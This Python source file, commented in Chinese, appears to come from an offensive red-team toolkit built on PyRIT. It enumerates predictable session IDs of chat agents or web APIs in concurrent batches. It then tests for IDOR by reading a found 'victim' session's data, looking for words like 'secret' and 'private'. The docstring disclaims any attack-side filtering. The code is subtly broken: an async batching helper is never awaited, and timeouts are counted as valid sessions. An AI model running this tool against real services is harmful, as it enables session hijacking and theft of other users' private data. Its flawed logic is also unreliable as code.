# -*- coding: utf-8 -*-
"""session_enumerator.py — Session ID 自动枚举器

自动化探测有效的 session ID, 支持多种枚举策略:
- SEQUENTIAL: 顺序递增枚举 (适用于结构化序列/整数)
- DICTIONARY: 字典攻击 (适用于用户名派生模式)
- TIME_WINDOW: 时间窗口枚举 (适用于时间戳派生)
- LEAK_BASED: 基于信息泄露 (从其他 API 获取有效 ID)

Academic basis:
    - OWASP: Session Identifier Enumeration
    - CWE-330: Use of Insufficiently Random Values
    - IDOR (Insecure Direct Object Reference)
    - PortSwigger: Session Hijacking via Predictable Tokens
    - Greshake et al. (arXiv:2302.12173) — Indirect Prompt Injection

使用示例:
    enumerator = SessionEnumerator(target, config)
    candidates = analyzer.generate_candidates(analysis_result, known_session)
    result = await enumerator.enumerate(candidates)
    # → result.valid_sessions = ["MC-20260325-0001", "...", "MC-20260325-0016"]
    # → result.idor_vulnerable = True

Constitution compliance:
    - R-SIZE: < 800 行
    - R-H3: 单一职责 — 仅枚举, 不执行复杂利用
    - C1: 使用 PyRIT PromptSendingAttack/HTTPTarget
    - C2: 不添加任何攻击端过滤
    - R-S1: 不硬编码目标标识符, 完全配置驱动
"""

from __future__ import annotations

import asyncio
import logging
import time
from dataclasses import dataclass, field
from enum import Enum
from typing import Any

logger = logging.getLogger(__name__)


class EnumStrategy(str, Enum):
    """枚举策略"""

    SEQUENTIAL = "sequential"  # 顺序递增
    DICTIONARY = "dictionary"  # 字典攻击
    TIME_WINDOW = "time_window"  # 时间窗口
    LEAK_BASED = "leak_based"  # 信息泄露


class ProbeMethod(str, Enum):
    """探测方法"""

    CHAT_API = "chat_api"  # 通过 chat API probe
    DIRECT_ACCESS = "direct_access"  # 直接访问 endpoint
    CONTEXT_SWITCH = "context_switch"  # 上下文切换


@dataclass
class EnumerationConfig:
    """枚举配置 (完全参数化, 无硬编码)"""

    strategy: EnumStrategy = EnumStrategy.SEQUENTIAL
    batch_size: int = 10  # 并发批次大小
    max_attempts: int = 1000  # 最大尝试次数
    rate_limit_ms: int = 100  # 请求间隔 (ms)
    timeout_sec: float = 5.0  # 请求超时
    probe_message: str = "ping"  # 探测消息
    idor_test_enabled: bool = True  # 自动 IDOR 验证
    idor_probe_message: str = "show my data"  # IDOR 探测消息
    session_field: str = "session_id"  # 请求中 session 字段名
    valid_response_hints: list[str] = field(default_factory=list)  # 有效响应特征
    invalid_response_hints: list[str] = field(default_factory=list)  # 无效响应特征


@dataclass
class ProbeResult:
    """单次探测结果"""

    session_id: str
    is_valid: bool
    response_code: int = 0
    response_body: str = ""
    response_time_ms: float = 0.0
    metadata: dict[str, Any] = field(default_factory=dict)


@dataclass
class EnumerationResult:
    """枚举完整结果"""

    valid_sessions: list[str] = field(default_factory=list)
    invalid_count: int = 0
    total_attempts: int = 0
    elapsed_seconds: float = 0.0
    idor_vulnerable: bool = False
    idor_proof: dict[str, Any] = field(default_factory=dict)
    probe_details: list[ProbeResult] = field(default_factory=list)

    @property
    def success_rate(self) -> float:
        if self.total_attempts == 0:
            return 0.0
        return len(self.valid_sessions) / self.total_attempts

    def to_dict(self) -> dict[str, Any]:
        return {
            "valid_sessions": self.valid_sessions,
            "invalid_count": self.invalid_count,
            "total_attempts": self.total_attempts,
            "elapsed_seconds": self.elapsed_seconds,
            "success_rate": self.success_rate,
            "idor_vulnerable": self.idor_vulnerable,
            "idor_proof": self.idor_proof,
        }


class SessionEnumerator:
    """Session ID 自动枚举器

    通过配置驱动, 支持多种枚举策略和验证方式。
    不硬编码任何目标适配逻辑 — 通过 config 参数化适用于任意 stateful agent。

    核心流程:
        1. 接收候选 session ID 列表 (由 SessionIDAnalyzer 生成)
        2. 按批次并发探测
        3. 分析响应判定有效性
        4. 可选: 自动 IDOR 验证
    """

    def __init__(
        self,
        http_target: Any,  # PyRIT HTTPTarget
        config: EnumerationConfig | None = None,
    ):
        self.http_target = http_target
        self.config = config or EnumerationConfig()

    async def enumerate(
        self,
        candidates: list[str],
    ) -> EnumerationResult:
        """执行 session ID 枚举

        Args:
            candidates: 候选 session ID 列表

        Returns:
            EnumerationResult 包含有效 session 列表和 IDOR 验证结果
        """
        start_time = time.time()
        result = EnumerationResult()

        # 分批处理
        batches = self._create_batches(candidates[: self.config.max_attempts])

        for batch in batches:
            batch_results = await self._probe_batch(batch)

            for probe in batch_results:
                result.total_attempts += 1
                if probe.is_valid:
                    result.valid_sessions.append(probe.session_id)
                else:
                    result.invalid_count += 1
                result.probe_details.append(probe)

        # 去重
        result.valid_sessions = list(set(result.valid_sessions))

        # IDOR 验证
        if self.config.idor_test_enabled and result.valid_sessions:
            idor_result = await self._verify_idor(result.valid_sessions[0])
            if idor_result:
                result.idor_vulnerable = True
                result.idor_proof = idor_result

        result.elapsed_seconds = time.time() - start_time
        return result

    async def _create_batches(self, candidates: list[str]) -> list[list[str]]:
        """将候选列表分批"""
        return [candidates[i : i + self.config.batch_size] for i in range(0, len(candidates), self.config.batch_size)]

    async def _probe_batch(self, session_ids: list[str]) -> list[ProbeResult]:
        """并发探测一批 session"""
        tasks = [self._probe_single(sid) for sid in session_ids]
        return await asyncio.gather(*tasks)

    async def _probe_single(self, session_id: str) -> ProbeResult:
        """探测单个 session ID"""
        start = time.time()

        try:
            # 构造带 session_id 的请求 (配置驱动字段名)
            payload = {
                "message": self.config.probe_message,
                self.config.session_field: session_id,
            }

            # 使用 PyRIT HTTPTarget 发送
            response = await self._send_request(payload)

            elapsed_ms = (time.time() - start) * 1000

            # 分析响应判定有效性
            is_valid = self._evaluate_response(response)

            return ProbeResult(
                session_id=session_id,
                is_valid=is_valid,
                response_code=getattr(response, "status_code", 200),
                response_body=self._extract_response_text(response),
                response_time_ms=elapsed_ms,
            )

        except Exception as e:
            elapsed_ms = (time.time() - start) * 1000
            logger.debug("Probe failed for %s: %s", session_id[:20], e)

            # 超时不一定表示无效, 可能是速率限制
            is_timeout = elapsed_ms >= self.config.timeout_sec * 1000

            return ProbeResult(
                session_id=session_id,
                is_valid=is_timeout,  # 超时常表示 session 存在但限流
                response_code=0,
                response_body=str(e),
                response_time_ms=elapsed_ms,
            )

    async def _send_request(self, payload: dict[str, Any]) -> Any:
        """发送请求 (PyRIT HTTPTarget 封装)"""
        # PyRIT HTTPTarget.send_request_async
        if hasattr(self.http_target, "send_request_async"):
            return await self.http_target.send_request_async(**payload)
        elif hasattr(self.http_target, "send_prompt_async"):
            # 对于 chat API, 使用 send_prompt_async
            return await self.http_target.send_prompt_async(
                prompt_text=payload.get("message", ""),
                prompt_request_metadata={self.config.session_field: payload.get(self.config.session_field)},
            )
        else:
            raise RuntimeError("HTTPTarget 不支持 send_request_async 或 send_prompt_async")

    def _evaluate_response(self, response: Any) -> bool:
        """评估响应判断 session 是否有效

        使用配置中的 hints 判定, 无 hardcode 规则。
        """
        response_text = self._extract_response_text(response).lower()

        # 如果配置了无效响应特征, 匹配则返回 False
        for hint in self.config.invalid_response_hints:
            if hint.lower() in response_text:
                return False

        # 如果配置了有效响应特征, 匹配则返回 True
        for hint in self.config.valid_response_hints:
            if hint.lower() in response_text:
                return True

        # 默认逻辑: 如果响应中没有错误信息则视为有效
        error_indicators = ["invalid session", "session not found", "unauthorized", "403", "404"]
        return not any(err in response_text for err in error_indicators)

    async def _verify_idor(self, victim_session: str) -> dict[str, Any] | None:
        """验证 IDOR: 尝试用 stolen session 访问数据"""
        try:
            payload = {
                "message": self.config.idor_probe_message,
                self.config.session_field: victim_session,
            }
            response = await self._send_request(payload)
            response_text = self._extract_response_text(response)

            # 如果成功获取到数据 (包含 notes/data/secrets 等关键词)
            data_indicators = ["note", "data", "content", "record", "secret", "private"]
            if any(ind in response_text.lower() for ind in data_indicators):
                return {
                    "victim_session": victim_session,
                    "data_sample": response_text[:500],  # 脱敏截断
                    "access_type": "READ",
                    "verified": True,
                }

        except Exception as e:
            logger.debug("IDOR verification failed: %s", e)

        return None

    @staticmethod
    def _extract_response_text(response: Any) -> str:
        """从响应对象提取文本"""
        if isinstance(response, str):
            return response
        if hasattr(response, "text"):
            return str(response.text)
        if hasattr(response, "content"):
            content = response.content
            return content.decode("utf-8", errors="replace") if isinstance(content, bytes) else str(content)
        return str(response)


class SessionEnumerationSuite:
    """Session 枚举套件 (高层封装)

    整合 Analyzer + Enumerator, 提供一键式 session 预测性测试。
    """

    def __init__(
        self,
        http_target: Any,
        config: EnumerationConfig | None = None,
    ):
        from strike.session.session_id_analyzer import SessionIDAnalyzer

        self.analyzer = SessionIDAnalyzer()
        self.enumerator = SessionEnumerator(http_target, config)

    async def full_test(
        self,
        known_session: str,
        analysis_result: Any,  # AnalysisResult
        max_candidates: int = 5000,
    ) -> EnumerationResult:
        """完整测试: 生成候选 → 枚举 → IDOR 验证"""
        # 生成候选列表
        candidates = self.analyzer.generate_candidates(analysis_result, known_session, max_candidates)

        # 执行枚举
        return await self.enumerator.enumerate(candidates)
